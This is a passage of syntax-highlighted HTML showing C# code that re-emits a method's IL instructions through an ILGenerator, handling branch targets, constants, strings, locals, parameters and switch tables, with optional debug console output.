</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Offset</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">": "</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc11">OpCode</span><span class="sc0"> </span><span class="sc11">code2</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineNone</span><span class="sc10">:</span><span class="sc0">    </span><span class="sc2">//   // no operand
</span><span class="sc0">                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineBrTarget</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">shorts</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">code</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Beq_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Beq</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bge_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bge</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bge_Un_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bge_Un</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bgt_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bgt_S</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bgt_Un_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bgt_Un</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ble_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ble</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ble_Un_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ble_Un</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Blt_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Blt</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Blt_Un_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Blt_Un</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bne_Un_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Bne_Un</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Br_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Br</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Brfalse_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Brfalse</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Brtrue_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Brtrue</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Leave_S</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Leave</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc2">//if(code.Name==code2.Name)
</span><span class="sc0">                                </span><span class="sc2">//  throw new Exception();
</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0">
                                </span><span class="sc11">code2</span><span class="sc10">=</span><span class="sc11">code</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">starget</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">starget</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc2">//    
</span><span class="sc0">                            </span><span class="sc2">// look for label's target
</span><span class="sc0">                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">labels</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc11">starget</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineBrTarget</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc2">//    
</span><span class="sc0">                            </span><span class="sc2">// look for label's target
</span><span class="sc0">                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">labels</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc11">target</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineI</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">short</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">SByte</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SByte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineI</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineI8</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineR</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">float</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineR</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">double</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineString</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\""</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">ShortInlineVar</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineVar</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"V_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                                </span><span class="sc2">//il.Emit(code, locals[(int)operand]);
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lbuilders</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lbuilders</span><span class="sc10">[(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">]);</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0">
                                    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//  
</span><span class="sc0">

                            </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">ParameterInfo</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc11">parameterInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ParameterInfo</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">inparams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">GetParameters</span><span class="sc10">();</span><span class="sc0">
                                
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">((</span><span class="sc11">parameterInfo</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
                                    </span><span class="sc11">parameterInfo</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"A_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">parameterInfo</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#endif                          
</span><span class="sc0">                                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">=</span><span class="sc11">parameterInfo</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">()==</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldarg_S</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">())</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">operandData</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// ?!
</span><span class="sc0">                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineSwitch</span><span class="sc10">:</span><span class="sc0">

                            </span><span class="sc16">int</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">[])</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"("</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">", "</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"L_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"x4"</span><span class="sc10">));</span><span class="sc0">  
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">")"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc11">Label</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">swlabels</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Label</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc11">targets</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
                            
                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">targets</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">labels</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">labeloffsets</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
                                        </span><span class="sc11">swlabels</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">labels</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">];</span><span class="sc0">
                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">swlabels</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineSig</span><span class="sc10">:</span><span class="sc0">
